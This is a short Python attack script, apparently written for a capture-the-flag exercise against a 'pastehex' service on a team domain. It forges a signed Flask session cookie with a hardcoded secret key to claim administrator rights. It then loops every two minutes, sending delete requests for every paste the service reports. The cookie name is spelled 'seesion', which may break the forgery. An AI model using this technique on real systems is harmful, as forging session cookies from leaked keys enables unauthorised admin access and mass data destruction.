from requests import get

from flask.sessions import SecureCookieSessionInterface
from time import sleep

def get_value():
    class App:
        secret_key = "420bf172a6297fc6558b8a6075af347a83b124ccd8551b181a62bac7aefef321"

    s = SecureCookieSessionInterface().get_signing_serializer(App)
    data = {"is_admin": True, "can_read_flag": False}
    return s.dumps(data)

value = get_value()
cookie = {"seesion": value}

while True:
    answer = get("https://pastehex.team-5.school.teamteam.dev/delete", cookies=cookie)
    stop = answer.json()["answer"]
    print(stop)
    for i in range(1, stop + 1):
        get(f"https://pastehex.team-5.school.teamteam.dev/delete/{i}", cookies=cookie)
    sleep(120)